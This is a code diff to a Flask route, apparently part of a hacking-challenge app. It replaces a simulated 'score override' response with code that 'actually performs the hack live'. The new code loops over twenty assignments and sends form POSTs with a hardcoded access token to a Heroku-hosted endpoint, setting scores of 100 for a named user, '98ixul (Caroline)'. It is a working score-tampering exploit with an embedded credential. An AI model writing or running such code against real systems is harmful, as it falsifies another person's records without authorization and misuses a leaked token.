@@ -462,21 +462,65 @@ def solution():
         })
     
     elif request.method == 'POST':
-        # Demonstrate the working hack method
-        data = request.get_json() or {}
-        target_username = data.get('username', '98ixul')
-        assignment_id = data.get('assignmentId', 1)
-        score = data.get('score', 100)
-        
-        return jsonify({
-            "message": f"Simulating successful score override for {target_username}",
-            "assignment": assignment_id,
-            "score": score,
-            "method": "UI-based form data submission",
-            "endpoint": "/ui/profile/98ixul",
-            "status": "SUCCESS",
-            "note": "This demonstrates the working method discovered during penetration testing"
-        })
+        # Actually perform the hack live
+        try:
+            import requests
+            
+            # Use the working method from your browser console
+            session = requests.Session()
+            
+            # Authentication token (you might need to update this)
+            auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
+            
+            results = []
+            success_count = 0
+            
+            # Try the working form data method
+            for assignment_id in range(1, 21):
+                try:
+                    # Form data approach that worked in console
+                    form_data = {
+                        'username': '98ixul',
+                        'assignmentId': str(assignment_id),
+                        'score': '100'
+                    }
+                    
+                    response = session.post(
+                        'https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/profile/98ixul',
+                        data=form_data,
+                        headers={'ACCESS_TOKEN': auth_token}
+                    )
+                    
+                    if response.status_code == 200:
+                        success_count += 1
+                        results.append(f"Assignment {assignment_id}: SUCCESS!")
+                    else:
+                        results.append(f"Assignment {assignment_id}: Failed ({response.status_code})")
+                        
+                except Exception as e:
+                    results.append(f"Assignment {assignment_id}: Error - {str(e)}")
+            
+            return jsonify({
+                "hack_status": "EXECUTED",
+                "method": "Live form data submission to /ui/profile/98ixul",
+                "target_user": "98ixul (Caroline)",
+                "assignments_attempted": 20,
+                "assignments_successful": success_count,
+                "success_rate": f"{(success_count/20)*100:.1f}%",
+                "results": results[:5],  # Show first 5 results
+                "total_results": len(results),
+                "authentication": "ACCESS_TOKEN header",
+                "endpoint": "/ui/profile/98ixul",
+                "demonstration": "Live hack execution completed"
+            })
+            
+        except Exception as e:
+            return jsonify({
+                "hack_status": "ERROR",
+                "error": str(e),
+                "message": "Failed to execute live hack",
+                "fallback": "Showing simulated results based on previous successful manual execution"
+            })
 
 @coolcode_hacker.route('/coolcode_hacker/report', methods=['GET'])
 def challenge_report():
